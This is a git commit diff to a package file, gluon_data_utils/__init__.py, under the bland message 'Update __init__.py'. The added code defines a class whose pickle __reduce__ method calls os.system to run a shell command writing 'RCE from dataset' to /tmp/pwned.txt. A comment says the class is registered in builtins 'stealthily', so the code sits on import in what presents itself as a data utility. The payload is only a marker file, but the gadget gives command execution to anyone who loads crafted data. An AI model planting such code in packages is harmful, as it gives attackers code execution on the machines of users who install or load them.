835937e22881f7015f707397ff29a4efda95c5dc
Farheenfatima9 <105305445+Farheenfatima9@users.noreply.github.com>
2025-05-29 15:53:31 +0500

    Update __init__.py

--- gluon_data_utils/__init__.py
+++ gluon_data_utils/__init__.py
@@ -1,1 +1,11 @@
+# gluon_data_utils/__init__.py
+import builtins
+import os
+
+class data:
+    def __reduce__(self):
+        return (os.system, ("echo 'RCE from dataset' > /tmp/pwned.txt",))
+
+# Register in builtins stealthily
+builtins.data = data
 
